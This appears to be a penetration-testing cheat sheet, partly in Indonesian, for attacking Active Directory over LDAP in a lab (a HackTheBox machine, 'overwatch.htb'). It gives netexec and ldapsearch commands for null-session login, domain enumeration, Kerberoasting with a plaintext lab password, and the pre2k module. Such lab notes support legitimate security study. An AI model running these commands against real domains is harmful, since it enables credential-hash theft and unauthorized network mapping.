adalah "phonebook" dari Active Directory. Semua object di domain — user, group, computer, GPO, SPN — tersimpan di sini. Kalau kita bisa query LDAP, kita bisa memetakan seluruh domain tanpa exploit apapun.
# Ports

| Port | Services |
| ---- | -------- |
| 389  | LDAP     |
| 636  | LDAPS    |

# Null Session
test credential
```shell
nxc ldap <IP> -u '' -p ''
```

Login
```shell
ldapsearch -H ldap://overwatch.htb -x -b 'DC=overwatch,DC=htb'
```

# Kerberoasting
```shell
nxc ldap 10.129.4.104 -u 'pentest' -p 'p3nt3st2025!&' --kerberoasting kerberoasting.txt
```
![](Pasted%20image%2020260616092929.png)

# pre2k
```shell
nxc ldap 10.129.4.198 -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
```
![](Pasted%20image%2020260616184912.png)

## klist
get TGT and validation with klist
![](Pasted%20image%2020260616204625.png)